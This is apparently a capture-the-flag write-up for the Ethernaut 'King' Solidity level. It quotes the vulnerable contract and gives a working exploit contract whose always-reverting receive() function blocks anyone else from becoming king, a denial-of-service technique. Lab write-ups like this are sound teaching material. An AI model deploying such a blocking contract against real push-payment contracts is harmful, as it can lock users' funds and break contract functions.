# King

>The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

>When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

For this challenge, We have to claim kingship in such a way that nobody else can become the king in the future.
For this, we have to send an amount of eth greater than or equal to the balance of the King contract. 
To get this balance, we can run the following command in the browser console.
```javascript
await contract.prize()
```

Now, we write a contract `exploit` which contains a function hack that simply sends a transaction sending the value of prize to the instance of the King contract. However, this only solves the first part of the challenge. The trickier second part is to avoid the reclaimation of kingship.

We must ensure that even though an amount greater than the current prize is sent by the next address, the transfer of funds(prize) must fail so as to remain as king. To do that the key lies in the receive function as it is the one that is called when king contract calls the tranfer function.

We do this by introducing a `receive` function that reverts no matter what.
```solidity
contract exploit{
    King king;

    constructor (address payable _king) payable{
        king = King(_king);
    }

    function hack()public {
        (bool done, ) = address(king).call{value : 0.001 ether}("");
        require(done,"failed");
    }

    receive() payable external {
        revert();
    } 
}
```

Next, deploy the above contract along with sending 0.001 ether to the exploit contract. 
Call the hack function and then check the king.
On confirmation, we can submit the instance.

NOTE : The exploit contract must be sent the prize amount at the time of deployment and constructor function thus made payable. This is because once the contract is deployed, any transaction which triggers the receive function reverts.

(The exploit contract can be deployed through remix using Injected Web3 Provider MetaMask.)
